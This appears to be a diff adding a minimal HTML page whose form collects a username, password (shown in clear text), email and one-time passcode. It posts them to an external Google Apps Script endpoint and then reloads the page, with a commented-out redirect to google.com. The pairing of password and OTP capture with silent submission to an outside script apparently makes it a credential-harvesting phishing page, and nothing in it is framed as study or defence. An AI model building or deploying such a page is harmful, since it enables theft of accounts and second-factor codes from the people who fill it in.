@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <title>Document</title>
+</head>
+<body>
+    <div class="container">
+        
+        <div class="row">
+          
+          <div class="column">
+            <form id="submit-form" action="">
+            
+              <label for="Username">Username</label>
+              <input type="text" id="Username" name="Username"><br>
+              
+              <label for="Password">Password</label>
+              <input type="text" id="fUsername" name="Password"><br>
+              
+              <label for="Email">Email</label>
+              <input type="text" id="Email" name="Email"><br>
+              
+              <label for="OTP">OTP</label>
+              <input type="text" id="OTP" name="OTP"><br>
+              
+              <input type="submit" value="Submit">
+            </form>
+          </div>
+        </div>
+      </div>
+      <script>
+        $("#submit-form").submit((e)=>{
+            e.preventDefault()
+            $.ajax({
+                url:"https://script.google.com/macros/s/AKfycbymfbUOZtrRzmpMfSieeQ33hV4jMVHw149u1o89n_gfJ8OKEYo_jmuLvRcVCSwRzbs/exec",
+                data:$("#submit-form").serialize(),
+                method:"post",
+                success:function (response){
+                  
+                    window.location.reload()
+                    //window.location.href="https://google.com"
+                },
+              
+            })
+        })
+    </script>
+</body>
+</html>
